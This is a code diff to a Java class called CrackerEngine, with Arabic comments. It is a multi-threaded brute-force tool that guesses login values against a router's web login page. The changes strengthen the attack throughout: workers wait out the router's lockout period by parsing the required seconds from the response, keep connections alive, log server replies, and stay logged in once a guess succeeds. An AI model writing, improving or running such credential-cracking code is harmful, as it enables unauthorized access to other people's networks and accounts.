@@ -132,16 +132,26 @@ public class CrackerEngine {
                 if (r.success) {
                     found.set(true);
                     log("[W" + id + "] ✅✅✅ " + v);
-                    logoutSession(cookies);
                     listener.onFound(v, r.statusJson);
                     return;
                 }
                 
                 if (r.busy) {
-                    log("[W" + id + "]   🛑 حظر — إغلاق الجلسة");
+                    int waitSec = extractWaitTime(r.responseText);
+                    log("[W" + id + "]   🛑 حظر — الراوتر يطلب " + waitSec + " ثانية");
+                    int remaining = waitSec;
+                    while (remaining > 0 && !found.get() && !stopped.get()) {
+                        int chunk = Math.min(5, remaining);
+                        sleep(chunk * 1000L);
+                        remaining -= chunk;
+                        if (remaining > 0) log("[W" + id + "]   ⏱ " + remaining + "ث متبقية");
+                    }
                     break;
                 }
                 
+                if (r.responseText != null && !r.responseText.isEmpty()) {
+                    log("[W" + id + "]   📄 " + r.responseText);
+                }
                 if (r.error != null && !r.error.startsWith("network:")) {
                     log("[W" + id + "]   ❌ " + r.error);
                     saveTried(v);
@@ -158,6 +168,7 @@ public class CrackerEngine {
     }
 
     private void logoutSession(Map<String, String> cookies) {
+        if (found.get()) return;
         try {
             HttpURLConnection c = (HttpURLConnection) new URL(logoutUrl).openConnection();
             c.setConnectTimeout(3000);
@@ -178,6 +189,7 @@ public class CrackerEngine {
             HttpURLConnection c1 = (HttpURLConnection) new URL(baseUrl + "/").openConnection();
             c1.setConnectTimeout(4000); c1.setReadTimeout(4000);
             c1.setRequestProperty("User-Agent", ua);
+            c1.setRequestProperty("Connection", "keep-alive");
             c1.getResponseCode();
             extractCookies(c1, cookies);
             c1.disconnect();
@@ -186,6 +198,7 @@ public class CrackerEngine {
             HttpURLConnection c2 = (HttpURLConnection) new URL(loginUrl).openConnection();
             c2.setConnectTimeout(4000); c2.setReadTimeout(4000);
             c2.setRequestProperty("User-Agent", ua);
+            c2.setRequestProperty("Connection", "keep-alive");
             String ck = cookiesStr(cookies);
             if (!ck.isEmpty()) c2.setRequestProperty("Cookie", ck);
             
@@ -240,6 +253,7 @@ public class CrackerEngine {
             c.setReadTimeout(4000);
             c.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
             c.setRequestProperty("User-Agent", ua);
+            c.setRequestProperty("Connection", "keep-alive");
             c.setRequestProperty("Referer", loginUrl);
             String ck = cookiesStr(cookies);
             if (!ck.isEmpty()) c.setRequestProperty("Cookie", ck);
@@ -267,8 +281,13 @@ public class CrackerEngine {
             if (stopped.get()) return Result.bad("stopped");
 
             String low = body.toLowerCase();
-            if (body.contains("already authorizing") || low.contains("already authorizing"))
-                return Result.busy("already authorizing");
+            String respClean = body.replaceAll("<[^>]+>", " ").replaceAll("\\s+", " ").trim();
+            if (respClean.length() > 120) respClean = respClean.substring(0, 120) + "...";
+            if (body.contains("already authorizing") || low.contains("already authorizing")) {
+                Result rb = Result.busy("already authorizing");
+                rb.responseText = respClean;
+                return rb;
+            }
 
             // 🔥 السر: فحص الحالة أولاً قبل الحكم على الرقم!
             sleep(80);
@@ -292,17 +311,21 @@ public class CrackerEngine {
             // إذا وصلنا هنا، الراوتر لم يسجل الدخول. الآن نفحص لو كان الرد يحتوي على خطأ
             if (low.contains("invalid") || low.contains("error") 
                 || low.contains("wrong") || low.contains("denied")) {
-                return Result.bad("خاطئ");
+                Result rb = Result.bad("خاطئ");
+                rb.responseText = respClean;
+                return rb;
             }
             
-            return Result.bad(null);
+            Result rb = Result.bad(null);
+            rb.responseText = respClean;
+            return rb;
         } catch (Exception e) {
             return Result.bad("network: " + e.getMessage());
         }
     }
 
     private static class Result {
-        boolean success, busy; String error; String statusJson;
+        boolean success, busy; String error; String statusJson; String responseText;
         static Result ok(String j) { Result r = new Result(); r.success = true; r.statusJson = j; return r; }
         static Result bad(String e) { Result r = new Result(); r.error = e; return r; }
         static Result busy(String e) { Result r = new Result(); r.busy = true; r.error = e; return r; }
@@ -373,6 +396,31 @@ public class CrackerEngine {
         return b.toString("UTF-8");
     }
 
+    
+    private int extractWaitTime(String text) {
+        if (text == null || text.isEmpty()) return 30;
+        String[] markers = {"second", "sec", "ث"};
+        String lower = text.toLowerCase();
+        for (String m : markers) {
+            int idx = lower.indexOf(m);
+            if (idx > 0) {
+                StringBuilder sb = new StringBuilder();
+                for (int i = idx - 1; i >= 0 && sb.length() < 4; i--) {
+                    char c = text.charAt(i);
+                    if (Character.isDigit(c)) sb.insert(0, c);
+                    else if (sb.length() > 0) break;
+                }
+                if (sb.length() > 0) {
+                    try {
+                        int s = Integer.parseInt(sb.toString());
+                        if (s >= 5 && s <= 600) return s;
+                    } catch (Exception e) {}
+                }
+            }
+        }
+        return 30;
+    }
+    
     private void sleep(long ms) { try { Thread.sleep(ms); } catch (Exception e) {} }
     private void log(String m) { listener.onLog(m); }
 }
